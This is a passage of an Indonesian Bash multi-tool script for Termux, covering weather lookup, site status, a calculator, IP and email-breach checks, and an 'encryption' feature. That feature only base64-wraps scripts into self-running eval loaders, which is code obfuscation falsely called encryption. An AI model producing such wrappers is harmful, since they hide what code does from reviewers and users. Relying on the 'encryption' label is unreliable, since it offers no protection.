  - Telegram: ${YELLOW}t.me/DanxyStore${GREEN}
  - TikTok  : ${YELLOW}Qwela.38${GREEN}

  ${YELLOW}${BOLD}Terima kasih telah menggunakan tools ini secara positif.
  Semoga memberikan manfaat dan wawasan baru untukmu.${GREEN}
  ${NC}"

  echo -e "${RED}
  ╭────────────────────────────────────────╮
  │          ${BLUE}DANXY OFFICIAL 80${RED}             │
  ╰────────────────────────────────────────╯
  ${NC}"
}

kembali_ke_menu() {
  read -n 1 -s -r -p "TEKAN ENTER UNTUK KEMBALI KE MENU AWAL" | lolcat -p 0.7
  echo
}

#show_whatsapp_support() {
#  echo -e "${BLUE}JANGAN LUPA JOIN CHANNEL DanxyBot YHA MAKASIH${NC}" | lolcat -p 0.7
#  xdg-open "$WHATSAPP_CHANNEL_URL" &
#  sleep 5
#}

kasi_warna_green() {
  echo -e "${GREEN}$1${NC}"
}

perkiraan_cuaca() {
clear
spasi
  echo -e "
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡀⠀⢀⣠⣤⣤⣴⣤⣦⣤⣤⣤⣀⡀⠀⠤⠤⡤⠂⠀⠀⠈⠙⠒⠒⠦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣡⣶⣿⣿⢿⣛⠿⣩⢯⡙⢯⣛⣟⡻⢿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠤⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣼⣿⡿⣟⠧⠛⢉⣀⡦⢤⠦⡴⢤⢤⣀⡉⠳⠮⣛⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡄⠀⠀
⠀⠀⠀⠀⢀⣼⣿⠿⡽⠃⣁⡴⢛⣩⣦⣵⣾⣶⣷⣾⣦⣼⣉⡓⢦⣈⠛⢼⣻⣿⣦⡀⠀⠀⠀⠀⠀⠀⣠⢨⠇⠀⠀
⠀⠀⠐⢠⣿⣿⣛⠋⣠⢞⣱⣼⡿⣟⡯⣏⠷⠽⠮⠷⣫⠿⠿⠻⢶⣌⠳⡄⠳⣭⣿⣷⡀⢤⣀⣀⡠⣪⠑⠁⠀⠀⠀
⠀⠀⢰⣿⣿⠿⠁⡴⣃⣾⣿⢯⡻⠙⠈⠀⠀⢀⡴⠂⠁⠀⠀⠀⠀⠈⠉⠺⡧⠜⠿⠿⣿⡴⠤⠤⠒⠁⠀⠀⠀⠀⠀
⠀⠂⣾⡿⢯⠃⣸⢓⣾⡿⣽⢞⠄⠤⠂⠤⢤⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⡀⠁⠀⠀⠀⠀⠀⠀⠀
⢠⢸⣿⣏⡏⢀⡧⢻⣽⣻⠇⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣗⠀⠀⠀⠀⠀⠀⠀⠀
⢠⢸⣿⣎⡇⢸⡜⣿⣟⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠤⢤⣀⠀⠀⠀⠀⠀
⢄⢸⣿⣎⡗⠘⣦⢹⣾⣟⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⣀⠀⠀⠀⠀⣠⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠈⠙⢦⡀⠀⠀
⠀⠊⣿⣷⢺⡄⡳⠝⠋⠛⠀⠀⠀⠀⠀⠘⢧⡀⢀⡰⠏⠀⠀⠀⠀⠘⢧⡄⢀⣤⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡄⠀
⠀⠀⠸⣿⡧⠋⠀⠀⠀⠀⠀⠀⠀⢠⢴⢰⣦⠍⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⣆⡦⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀
⠀⠀⠀⢹⡁⠀⠀⠀⠀⠀⠀⠀⠀⠙⠘⠛⠁⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⠈⠙⠛⠙⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃
⠀⠀⠀⢸⡀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣝⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⡾⠀
⠀⠀⠀⠘⡇⠀⠀⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢀⡼⠁⠀
⠀⠀⠀⠀⠘⠦⡀⠀⠉⠓⠂⠄⠂⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢒⠉⣁⠴⠊⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠒⠢⠤⠤⠐⡄⠈⠳⠤⠄⠀⠀⠰⣄⡀⣀⠴⠃⣀⠀⠀⠲⣄⡀⠀⠀⡠⠔⠋⣴⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠱⢄⡀⠀⠀⠀⠀⠀⠀⣀⠤⠚⠉⢷⣀⠀⠀⠈⠁⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠂⠀⠀⠀⠉⠁⠀⠀⠀⠀⠈⠑⠒⠀⠀⠐⠒⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" | lolcat -p 0.7
echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │             ${YELLOW}${BOLD}CEK PREDIKSI CUACA${CYAN}         │
  ╰────────────────────────────────────────╯${NC}"
  read -p "MASUKAN LOKASI (CONTOH: JAWA TENGAH, BANDUNG): " lokasi

  if ! command_exists curl; then
    echo -e "${RED}curl tidak ditemukan. Instal curl untuk menggunakan fitur ini.${NC}"
    return 1
  fi

  # Periksa koneksi internet (contoh sederhana)
  if ! ping -c 1 google.com > /dev/null; then
    echo -e "${RED}Tidak ada koneksi internet. Periksa koneksi Anda dan coba lagi.${NC}"
    return 1
  fi

  cuaca=$(curl -s "http://wttr.in/$lokasi?format=%l:+%C+%t")

  if [ -z "$cuaca" ]; then
    echo -e "${RED}Tidak dapat menemukan informasi cuaca untuk lokasi '$lokasi'. Pastikan lokasi yang Anda masukkan benar dan coba lagi.${NC}"
    return 1
  fi

  echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │        ${YELLOW}PERKIRAAN CUACA${CYAN}           │
  ╰────────────────────────────────────────╯${NC}"

  echo -e "${GREEN}$cuaca${NC}"

  echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │           ${YELLOW}DANXY OFFICIAL 80${CYAN}            │
  ╰────────────────────────────────────────╯${NC}"
}


cek_status_website() {
  clear 
  spasi
  echo -e "
  
                                                                            
   _|_|_|   _|_|_|_|   _|    _|       _|          _|   _|_|_|_|   _|_|_|    
 _|         _|         _|  _|         _|          _|   _|         _|    _|  
 _|         _|_|_|     _|_|           _|    _|    _|   _|_|_|     _|_|_|    
 _|         _|         _|  _|           _|  _|  _|     _|         _|    _|  
   _|_|_|   _|_|_|_|   _|    _|           _|  _|       _|_|_|_|   _|_|_|" | lolcat -p 0.7
  echo -e "${BG_RED}${YELLOW}CUBIT LAYAR UNTUK MENYESUAIKAN${NC}"
  read -p "Masukkan URL website yang ingin diperiksa (contoh: https://www.google.com): " url
  # Cek apakah curl tersedia
  if ! command -v curl &> /dev/null; then
    echo -e "${RED}curl tidak ditemukan. Instal curl untuk menggunakan fitur ini.${NC}"
    return 1
  fi

  # Cek jika input kosong
  if [ -z "$url" ]; then
    echo -e "${RED}URL tidak boleh kosong.${NC}"
    return 1
  fi

  echo -e "${GREEN}Memeriksa status website...${NC}"

  # Kirim permintaan HEAD untuk mendapatkan status HTTP
  status=$(curl -s -o /dev/null -w "%{http_code}" "$url")

  # Tampilkan hasil
  if [ "$status" -eq 200 ]; then
    echo -e "${GREEN}Website aktif (Status: $status).${NC}"
  else
    echo -e "${RED}Website tidak merespons dengan benar (Status: $status).${NC}"
  fi
}

kalkulator() {
  while true; do
    clear
    spasi
    echo -e "
  ┌────────────────────────────────────────────────────────┐
  │  ██╗░░██╗░█████╗░██╗░░░░░███╗░░░███╗██╗░░░██╗██╗░░██╗  │
  │  ██║░██╔╝██╔══██╗██║░░░░░████╗░████║██║░░░██║╚██╗██╔╝  │
  │  █████═╝░███████║██║░░░░░██╔████╔██║██║░░░██║░╚███╔╝░  │
  │  ██╔═██╗░██╔══██║██║░░░░░██║╚██╔╝██║██║░░░██║░██╔██╗░  │
  │  ██║░╚██╗██║░░██║███████╗██║░╚═╝░██║╚██████╔╝██╔╝╚██╗  │
  │  ╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝  │
  └────────────────────────────────────────────────────────┘
  │            DANXY TOOLS V8.4 FITUR KALKULATOR           │
  └────────────────────────────────────────────────────────┘
  │ DEVELOPER DANXY OFFICIAL │
  └──────────────────────────┘" | lolcat -p 0.7
     echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │             ${YELLOW}${BOLD}ALL KALKULATOR${CYAN}             │
  ╰────────────────────────────────────────╯${NC}"
    echo "1. Penjumlahan"
    echo "2. Pengurangan"
    echo "3. Perkalian"
    echo "4. Pembagian"
    echo "5. Pangkat"
    echo "6. Akar Kuadrat"
    echo "7. Persen"
    echo "8. Ekspresi Bebas (pakai + - * / ^ dst)"
    echo "0. Keluar"
    echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │             ${YELLOW}${BOLD}ALL KALKULATOR${CYAN}             │
  ╰────────────────────────────────────────╯${NC}"
    read -p "PILIH MENU KALKULATOR [0-8]: " pilih

    case $pilih in
      1)
        read -p "Masukkan angka pertama: " a
        read -p "Masukkan angka kedua: " b
        echo "Hasil: $((a + b))"
        ;;
      2)
        read -p "Masukkan angka pertama: " a
        read -p "Masukkan angka kedua: " b
        echo "Hasil: $((a - b))"
        ;;
      3)
        read -p "Masukkan angka pertama: " a
        read -p "Masukkan angka kedua: " b
        echo "Hasil: $((a * b))"
        ;;
      4)
        read -p "Masukkan angka pertama: " a
        read -p "Masukkan angka kedua: " b
        echo "Hasil: $((a / b))"
        ;;
      5)
        read -p "Masukkan angka: " a
        read -p "Dipangkatkan berapa: " b
        echo "Hasil: $(echo "$a ^ $b" | bc)"
        ;;
      6)
        read -p "Masukkan angka: " a
        echo "Hasil akar kuadrat: $(echo "scale=4; sqrt($a)" | bc)"
        ;;
      7)
        read -p "Masukkan nilai (misal: 30): " a
        read -p "Persen berapa (misal: 15): " b
        echo "$b% dari $a adalah: $(echo "scale=2; $a * $b / 100" | bc)"
        ;;
      8)
        read -p "Masukkan ekspresi matematika (contoh: 5+3*2^2): " ekspresi
        hasil=$(echo "scale=4; $ekspresi" | sed 's/\^/**/g' | bc -l 2>/dev/null)
        echo "Hasil: $hasil"
        ;;
      0)
        echo "Keluar dari kalkulator."
        break
        ;;
      *)
        echo "Pilihan tidak valid!"
        salah
        ;;
    esac

    echo ""
    read -p "Tekan ENTER untuk kembali ke menu..."
  done
}
lapor_error() {
clear
loading
clear
  echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │             ${YELLOW}LAPOR ERROR${CYAN}            │
  ╰────────────────────────────────────────╯${NC}" | lolcat -p 0.7
  xdg-open "$LAPOR_TOOLS_ERROR" &
}




cek_ip_publik() {
  clear
  loading
  echo -e "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⢤⣶⣯⣿⣶⣿⣷⣶⣿⣭⣶⣄⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣔⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣔⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣧⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣕⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⣢⢄⡀⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣯⣴⡦⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠈⠉⠛⠛⢿⠿⣿⣿⣿⠿⠟⠃⠁⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠉⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣟⣯⣷⡿⠋⠀⠀⠀⢀⠀⠀⢀⠀⠀⠘⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣻⣾⡿⠞⢻⣾⣿⠀⠀⠀⠀⠙⠲⠶⠛⠀⠀⠀⠈⢢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⢸⣷⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣿⣿⣿⣿⣿⣿⡿⣽⣷⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⡄⠀⠀⠀⠀⠀⠀⠀
⠀⢀⢾⣿⣿⣿⣿⡿⣯⢿⣽⣻⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠉⠉⣠⣷⣿⣿⣿⣿⣾⡽⣯⣟⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣨⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣾⣾⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣷⣕⢄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣰⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣸⣿⣿⣶⣃⠀⣀⠀⠀⠀⣀⠀
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠏⢹⣿⣾⣳⣿⡿⣾⢿⡿⣮⠃
⠀⠉⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⡀⠀⠀⠀⠀⠀⣸⠄⢸⣿⣳⣿⣿⡿⣽⢯⣟⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠻⢟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⢇⠀⠐⠒⠊⠉⠀⣾⣷⣻⣟⣻⣿⢯⡿⣽⣞⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣂⠀⠀⠀⠀⠀⠹⣷⣯⣿⣻⡽⣯⣟⣷⣿⠃
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣏⡆⠀⠀⠀⠀⠀⠉⠻⠟⠿⢿⣿⡿⠻⠋⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⢿⣿⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣏⡿⢗⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" | lolcat -p 0.7  
echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │             ${YELLOW}${BOLD}IP IP PUBLIK${CYAN}                  │
  ╰────────────────────────────────────────╯${NC}"
  ip=$(curl -s ifconfig.me)
  echo "IP Publik kamu: $ip"
}

cek_kebocoran_gmail() {
  clear
  spasi
  echo -e "${RED}
░█████╗░░░░░██████╗░███╗░░░███╗░█████╗░██╗██╗
██╔══██╗░░░██╔════╝░████╗░████║██╔══██╗██║██║
██║░░╚═╝░░░██║░░██╗░██╔████╔██║███████║██║██║
${WHITE}██║░░██╗░░░██║░░╚██╗██║╚██╔╝██║██╔══██║██║██║
╚█████╔╝██╗╚██████╔╝██║░╚═╝░██║██║░░██║██║███████╗
░╚════╝░╚═╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚══════╝${NC}
[${RED} ! ${NC}] ${GREEN}CEK KEBOCORAN GMAIL KAMU DI SEBUAH WEBSITE ILEGAL"
echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │        ${YELLOW}${BOLD}CEK KEBOCORAN GMAIL${CYAN}           │
  ╰────────────────────────────────────────╯${NC}" 
  
  echo ""
  read -p "EMASUKAN GMAIL YNG MAU DI CEK: " gmail

  if [[ ! "$gmail" =~ ^[a-zA-Z0-9._%+-]+@gmail\.com$ ]]; then
    echo -e "${RED}Format Gmail tidak valid!${NC}"
    return
  fi

  echo -e "\nMengecek kebocoran untuk: $gmail ..."
  
  sleep 1

  hasil=$(curl -s "https://haveibeenpwned.com/unifiedsearch/$gmail" -H "User-Agent: Bash-Tools" | grep -o 'Name\":\"[^\"]*')

  if [[ -z "$hasil" ]]; then
    echo -e "${GREEN}[ ✓ ] Aman! Tidak ditemukan di database kebocoran publik.${NC}"
  else
    echo -e "${RED}TERDETEKSI! Email ini pernah terlibat kebocoran:${NC}"
    echo "$hasil" | sed 's/Name\":\"/  - /g'
  fi
}
  
encrypsi() {
RED='\e[31m' GREEN='\e[32m' YELLOW='\e[33m' CYAN='\e[36m' NC='\e[0m' BG_RED='\e[41m'
spasi() { echo; }

multi_encrypt() {
  clear
  spasi
  echo -e "
  ┌──────────────────────────────────────────────────────┐
  │  ███████╗███╗░░██╗░█████╗░██████╗░██╗░░░██╗██████╗   │
  │  ██╔════╝████╗░██║██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗  │
  │  █████╗░░██╔██╗██║██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝  │
  │  ██╔══╝░░██║╚████║██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝   │
  │  ███████╗██║░╚███║╚█████╔╝██║░░██║░░░██║░░░██║       │
  │  ╚══════╝╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝       │
  └──────────────────────────────────────────────────────┘
  │      ${YELLOW}MULTI-ENCRYPT : BASH | PYTHON | HTML | JS  ${NC}     │
  └──────────────────────────────────────────────────────┘
                   │  ${BG_RED}${WHITE}ENC BY TOOLS V8.4${NC}  │
                   └─────────────────────┘" | lolcat -p 0.7
  spasi
  printf "${GREEN}  ┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}PATH TARGET${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
  read -r TARGET
#  read -rp "[ ? ] PATH TARGET : " TARGET
  [[ ! -f "$TARGET" ]] && { echo -e "${RED}[✗] File tidak ditemukan!${NC}"; read -rp "ENTER UNTUK KEMBALI"; return; }

  EXT="${TARGET##*.}"
  case "$EXT" in
    sh)   HEADER='#!/bin/bash' ;;
    py)   HEADER='#!/usr/bin/env python3' ;;
    html) HEADER='' ;;
    js)   HEADER='' ;;
    *)    echo -e "${RED}[ ✗ ] Ekstensi .$EXT tidak didukung!${NC}"; read -rp "ENTER UNTUK KEMBALI"; return ;;
  esac

  B64=$(base64 -w 0 "$TARGET")
  OUT="${TARGET%.*}_Enc-By-ToolsV84.${EXT}"

  case "$EXT" in
    sh)
      cat > "$OUT" <<EOF
$HEADER
eval "\$(echo '$B64' | base64 -d)"
EOF
      ;;
    py)
      cat > "$OUT" <<EOF
$HEADER
import base64, os, sys, tempfile
code = base64.b64decode('$B64').decode()
with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
    f.write(code); tmp=f.name
os.system(f'{sys.executable} {tmp}'); os.remove(tmp)
EOF
      ;;
    html)
      cat > "$OUT" <<EOF
<!doctype html>
<html><head><meta charset="utf-8"><title>Encrypted</title></head><body>
<script>document.write(atob('$B64'));</script>
</body></html>
EOF
      ;;
    js)
      cat > "$OUT" <<EOF
eval(atob('$B64'));
EOF
      ;;
  esac

  chmod +x "$OUT" 2>/dev/null
  echo -e "${GREEN}[✓] SUKSES → $OUT ${NC}"
  read -rp "[ ? ] ENTER UNTUK KEMBALI"
}

# ---------- MENU UTAMA ----------
while true; do
  clear
  spasi
  echo -e "
  ┌──────────────────────────────────────────────────────┐
  │  ███████╗███╗░░██╗░█████╗░██████╗░██╗░░░██╗██████╗   │
  │  ██╔════╝████╗░██║██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗  │
  │  █████╗░░██╔██╗██║██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝  │
  │  ██╔══╝░░██║╚████║██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝   │
  │  ███████╗██║░╚███║╚█████╔╝██║░░██║░░░██║░░░██║       │
  │  ╚══════╝╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝       │
  └──────────────────────────────────────────────────────┘
  │      ${YELLOW}MULTI-ENCRYPT : BASH | PYTHON | HTML | JS  ${NC}     │
  └──────────────────────────────────────────────────────┘
                   │  ${BG_RED}${WHITE}ENC BY TOOLS V8.4${NC}  │
                   └─────────────────────┘" | lolcat -p 0.7
  spasi
  echo -e "  ┌──────────────────────[ ${BG_RED}${YELLOW} MENU ${NC} ]──────────────────────┐
  │   ${CYAN}[ 1 ]${NC} ENCRYPSI CODE PEMOGRAMAN                     │
  │   ${CYAN}[ 2 ]${NC} KELUAR DARI FITUR ENCRYPSI                   │
  └──────────────────────────────────────────────────────┘" | lolcat -p 0.7
  
  spasi
  printf "${GREEN}  ┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}ENCRYPSI${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
  read -r PIL
        
#  read -rp "  Pilih [1-2] : " PIL
  case "$PIL" in
    1) multi_encrypt ;;
    2) echo -e "${GREEN}BACK TO MENU UTAMA${NC}"; exit 0 ;;
    *) echo -e "${RED}MAAF BRO PILIHAN KAMU SALAH${NC}"; sleep 1 ;;
  esac
done
}

play_music() {
    # auto-install mpv jika belum ada
    if ! command -v mpv &>/dev/null; then
        echo -e "${RED}[+] Installing mpv...${NC}"
        echo -e "${GREEN} SABAR PROSES 1-2 MENIT ${NC}"
        pkg install -y mpv >/dev/null 2>&1
    fi

    # cek lagi setelah install
    if command -v mpv &>/dev/null; then
        mpv --no-video --loop-file "$LAGU_YOUTUBE" >/dev/null 2>&1 &
    else
        echo -e "${RED}mpv masih gagal di-install atau tidak ditemukan!${NC}"
    fi
}


stop_music() {
  pkill mpv
}

browse_web() {
  if ! command_exists w3m; then
    echo -e "${RED}w3m tidak ditemukan. Instal w3m untuk menggunakan fitur ini.${NC}"
    return 1
  fi

  read -p "Masukkan URL yang ingin dibuka: " url
  w3m "$url"
}

lacak_nama() {
clear
spasi
echo -e "
⠀⠀⠀⠀⠀⠀⣀⣤⡴⢶⣦⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣴⢶⡴⣤⢦⣤⡤⣤⢤⡤⣤⢤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣀⠶⣛⣽⣶⣿⣟⣛⣻⣋⣉⣉⠉⠉⠉⠉⠉⢙⣻⣛⣿⣿⣶⣷⣤⡛⡔⣣⢜⢢⣃⠶⣈⠛⡦⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣼⣿⣿⠿⠏⠉⠉⠉⠉⠉⠉⠉⠙⠟⠷⣤⣤⣤⣿⡽⠋⠀⠀⣤⡿⢿⠻⣿⣴⣉⠶⣌⠲⣉⠳⡜⠬⢦⠀⠀⠀⠀⠀⠀
⠀⣼⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣯⣿⡽⠏⠀⠀⣠⣾⢟⡀⠸⢧⡌⠹⣷⣞⢬⠣⣍⢲⡙⡮⢩⢧⠀⠀⠀⠀⠀
⠘⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣩⣿⣽⠿⠀⠀⢠⡿⠛⢁⠈⠿⣆⡀⠛⠇⣸⣿⣆⡛⣤⣳⣼⡿⠿⠿⠷⣶⣤⣤⣠
⠀⠀⠀⠀⠀⠀⢀⣤⡶⡶⠶⠶⠶⣶⢾⣷⣷⡞⠀⠀⢰⡾⠁⠀⠙⢷⡄⠘⢁⣤⣶⠋⢙⣿⡿⠻⠋⠁⠀⠀⠀⠀⢠⣴⣿⣿
⠀⠀⠀⠀⢀⣴⣾⣿⡷⠿⡉⠉⠉⠹⠿⣦⡹⢦⡀⠀⠈⠻⣦⡀⠀⢠⣤⡶⠞⡁⣠⡿⠟⠁⠀⠀⠀⠀⢠⣤⣶⣿⣿⣿⣿⢿
⠀⠀⠀⢀⡿⢿⡟⠡⣴⣶⣿⣿⣿⣷⣦⡄⢻⡆⢿⡄⠀⠀⠀⠛⠛⠋⠀⣤⡴⠛⠋⠀⠀⠀⠀⠀⢠⣴⣿⣿⣿⣿⣿⡿⠋⠀
⠀⠀⠀⢘⡇⣾⠁⣾⣿⣿⠙⣿⣿⣿⣿⣷⠂⢹⣞⡇⠀⠀⠀⣀⣴⡿⠟⠉⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⡿⠟⠀⠀⠀
⠀⠀⠀⢠⡧⣟⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡃⢸⡯⣧⣤⠶⠿⠛⠈⠀⠀⠀⠀⠀⠀⠀⢀⣶⣿⣿⣿⣿⣿⡿⢿⡇⠀⠀⠀⠀
